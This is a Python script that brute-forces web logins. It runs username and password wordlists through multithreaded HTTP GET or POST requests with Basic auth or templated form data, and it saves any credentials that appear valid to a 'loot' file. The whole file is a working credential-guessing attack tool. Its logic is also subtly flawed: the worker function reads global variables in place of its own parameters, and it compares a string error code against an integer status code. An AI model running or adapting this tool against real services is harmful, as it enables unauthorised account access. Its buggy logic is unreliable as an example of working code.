#!/usr/bin/env python3
import base64
import os
from threading import Thread, Lock

import requests

DEFAULT_THREADS_LIMIT = 10
DEFAULT_RESTORE_FILE = 'bruteforce-restore.txt'
DEFAULT_LOOT_FILE = 'bruteforce-loot.txt'
DEFAULT_CONTENT_TYPE = 'application/x-www-form-urlencoded'

DEFAULT_ERROR_CODE = '401'

lock = Lock()


def get_arguments():
    from argparse import ArgumentParser
    parser = ArgumentParser()
    parser.add_argument('--method',
                        dest='method',
                        default='GET',
                        required=False,
                        help='HTTP method to use. Default is GET')
    parser.add_argument('--post-data',
                        dest='post_data',
                        required=False,
                        help='POST data to send. '
                             'If you want to bruteforce the POST data, '
                             'you need to specify your input parameters as ^USER^ and ^PASS^')
    parser.add_argument('--content-type',
                        dest='content_type',
                        required=False,
                        help='Specify the content type of the given POST data. '
                             f'Default is {DEFAULT_CONTENT_TYPE}')
    parser.add_argument('--url',
                        dest='url',
                        required=True,
                        help='An URL of the targeted web-site')
    parser.add_argument('--user',
                        dest='user',
                        required=False,
                        help='A username to bruteforce')
    parser.add_argument('--user-file',
                        dest='user_file',
                        required=False,
                        help='A txt file with usernames to bruteforce')
    parser.add_argument('--password',
                        dest='password',
                        required=False,
                        help='A password to bruteforce')
    parser.add_argument('--password-file',
                        dest='password_file',
                        required=False,
                        help='A txt file with passwords to bruteforce')
    parser.add_argument('--error-code',
                        dest='error_code',
                        required=False,
                        default=DEFAULT_ERROR_CODE,
                        type=str,
                        help='Specify an error HTTP status code to compare with incoming responses. '
                             f'Default is {DEFAULT_ERROR_CODE}')
    parser.add_argument('--error-message',
                        dest='error_message',
                        required=False,
                        default=DEFAULT_ERROR_CODE,
                        type=str,
                        help='Specify a string that matches error messages from the HTTP responses. '
                             f'By default only the HTTP status code is compared with API messages.')
    parser.add_argument('--threads',
                        dest='threads',
                        required=False,
                        default=DEFAULT_THREADS_LIMIT,
                        type=int,
                        help='Specify a number of threads to use while bruteforcing the server. '
                             f'Default is {DEFAULT_THREADS_LIMIT}')
    parser.add_argument('-v',
                        '--verbose',
                        action='store_true',
                        required=False,
                        help='Be verbose. Print service responses.')
    options = parser.parse_args()
    if not options.user and not options.user_file:
        parser.error('You have to give a username to bruteforce. Use --help for more info')
    if not options.password and not options.password_file:
        parser.error('You have to give a password to bruteforce. Use --help for more info')
    return options


def bruteforce(url,
               login,
               password,
               method='GET',
               post_data='',
               content_type=DEFAULT_CONTENT_TYPE,
               error_code=DEFAULT_ERROR_CODE,
               error_message=None,
               verbose=False,
               loot_file=DEFAULT_LOOT_FILE):
    global counter
    global total_count
    auth_header = f'Basic {base64.b64encode(bytes(login + ":" + password, "utf-8")).decode("ascii")}'

    post_data = post_data.replace('^USER^', user).replace('^PASS^', password)

    try:
        headers = {
            'Authorization': auth_header,
            'Content-Type': content_type
        }
        if method == 'GET':
            resp = requests.get(url,
                                headers=headers)
        elif method == 'POST':
            resp = requests.post(url,
                                 data=post_data,
                                 headers=headers)
        else:
            raise Exception('Unsupported HTTP method')

        log_message = f'[{counter}/{total_count}] Bruteforcing [{url}] [{user}:{passwd}]'
        if verbose:
            log_message = f'{log_message} [{resp.status_code}] - [{resp.text}]'
        print(log_message)
        if resp.status_code != error_code and error_message not in resp.text:
            creds = f'{user}:{passwd}'

            success_message = f'Found valid credentials: [{creds}]'
            if verbose:
                success_message = f'{success_message} [{resp.status_code}] - [{resp.text}]'
            print(success_message)

            lock.acquire()
            with open(loot_file, 'a') as f:
                f.write(creds)
                f.write(os.linesep)
            lock.release()
    except Exception as e:
        print(f'[{url}] [{login}:{password}] - {e}')


options = get_arguments()

if options.post_data and options.method == 'GET':
    raise Exception('POST data is given with a wrong HTTP method')
if options.method != 'GET' and options.method != 'POST':
    raise Exception('Unsupported HTTP method')

usernames = set()
passwords = set()

if options.user:
    usernames.add(options.user)
if options.user_file:
    print('Loading a wordlist with usernames...')
    with open(options.user_file, 'r', errors='ignore') as f:
        lines = f.readlines()
        for i, line in enumerate(lines):
            usernames.add(line.strip())
            print(f'{i}/{len(lines)}\r', end='', flush=True)
if options.password:
    passwords.add(options.password)
if options.password_file:
    print('Loading a wordlist with passwords...')
    with open(options.password_file, 'r', errors='ignore') as f:
        lines = f.readlines()
        for i, line in enumerate(lines):
            passwords.add(line.strip())
            print(f'{i + 1}/{len(lines)}\r', end='', flush=True)

counter = 1
total_count = len(usernames) * len(passwords)
print('Starting the bruteforce')

if os.path.exists(DEFAULT_RESTORE_FILE):
    with open(DEFAULT_RESTORE_FILE, 'r') as f:
        used_combinations = [line.strip() for line in f.readlines() if line.strip()]
else:
    used_combinations = []

bruteforce_threads = []

for i, user in enumerate(usernames):
    for y, passwd in enumerate(passwords):
        creds = f'{user}:{passwd}'
        if creds in used_combinations:
            continue
        else:
            used_combinations.append(creds)
            with open(DEFAULT_RESTORE_FILE, 'a') as f:
                f.write(creds)
                f.write(os.linesep)

            while len(bruteforce_threads) > options.threads:
                for thread in bruteforce_threads.copy():
                    if not thread.is_alive():
                        bruteforce_threads.remove(thread)

            bruteforce_thread = Thread(target=bruteforce,
                                       args=(options.url,
                                             user,
                                             passwd,
                                             options.method,
                                             options.post_data,
                                             options.content_type,
                                             options.error_code,
                                             options.error_message,
                                             options.verbose))
            bruteforce_threads.append(bruteforce_thread)
            bruteforce_thread.start()

            counter += 1
while any(thread.is_alive() for thread in bruteforce_threads):
    pass
